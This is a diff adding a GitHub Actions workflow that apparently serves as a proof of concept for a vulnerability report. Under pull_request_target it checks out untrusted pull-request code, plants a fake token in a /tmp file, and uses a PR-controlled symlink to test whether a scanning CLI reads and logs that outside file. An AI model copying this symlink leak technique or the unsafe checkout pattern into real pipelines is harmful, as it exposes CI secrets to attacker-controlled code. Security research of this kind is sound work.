@@ -1,0 +1,96 @@
+name: C1 Config Symlink Delivery Proof
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  pull-requests: read
+
+jobs:
+  c1-config-symlink-delivery:
+    if: >-
+      github.event.pull_request.head.repo.full_name == 'cllc3993/checks-s1-ci-impact-poc' &&
+      startsWith(github.event.pull_request.head.ref, 'c1-cross-principal-')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR head
+        uses: actions/checkout@v4
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Create victim-owned outside config file
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/checks-c1-victim-owned
+          target=/tmp/checks-c1-victim-owned/obfuscated-key.yml
+          # The decoded key starts with ghs_, but setup does not print it.
+          printf '"\\u0067\\u0068\\u0073\\u005fFAKE_C1_CROSS_%s_%s": value\n' \
+            "$GITHUB_RUN_ID" "$GITHUB_RUN_ATTEMPT" > "$target"
+          chmod 600 "$target"
+          printf 'outside-config-target=%s\n' "$target"
+          printf 'outside-config-bytes=%s\n' "$(wc -c < "$target")"
+
+      - name: Verify PR-controlled .checks symlink
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -L .checks
+          target="$(readlink .checks)"
+          test "$target" = "/tmp/checks-c1-victim-owned/obfuscated-key.yml"
+          printf 'checks-symlink-target=%s\n' "$target"
+          git ls-files -s .checks MainActivity.java
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed --fail --silent --show-error \
+            https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Run C1 default logging control
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/c1-default-logs"
+          default_status=0
+          GOOGLE_LOG_DIR="$RUNNER_TEMP/c1-default-logs" \
+            ./checks code scan . \
+              --skip-upload \
+              --format=json \
+              --repo-id=1 \
+              --account-id=1 \
+              --disable-analytics \
+              --disable-version-check \
+              --no-input \
+              > "$RUNNER_TEMP/c1-default-stdout.json" \
+              2> "$RUNNER_TEMP/c1-default-stderr.log" || default_status=$?
+          printf 'default-scan-exit=%s\n' "$default_status"
+          printf 'default-stdout-bytes=%s\n' "$(wc -c < "$RUNNER_TEMP/c1-default-stdout.json")"
+          printf 'default-stderr-bytes=%s\n' "$(wc -c < "$RUNNER_TEMP/c1-default-stderr.log")"
+          printf 'default-log-files=%s\n' "$(find "$RUNNER_TEMP/c1-default-logs" -type f -name 'checks.*.log.*' | wc -l)"
+          exit "$default_status"
+
+      - name: Run C1 stderr logging experiment
+        shell: bash
+        run: |
+          set -euo pipefail
+          stderr_status=0
+          GOOGLE_LOGTOSTDERR=1 \
+            ./checks code scan . \
+              --skip-upload \
+              --format=json \
+              --repo-id=1 \
+              --account-id=1 \
+              --disable-analytics \
+              --disable-version-check \
+              --no-input \
+              > "$RUNNER_TEMP/c1-stderr-stdout.json" || stderr_status=$?
+          printf 'stderr-scan-exit=%s\n' "$stderr_status"
+          printf 'stderr-stdout-bytes=%s\n' "$(wc -c < "$RUNNER_TEMP/c1-stderr-stdout.json")"
+          exit "$stderr_status"
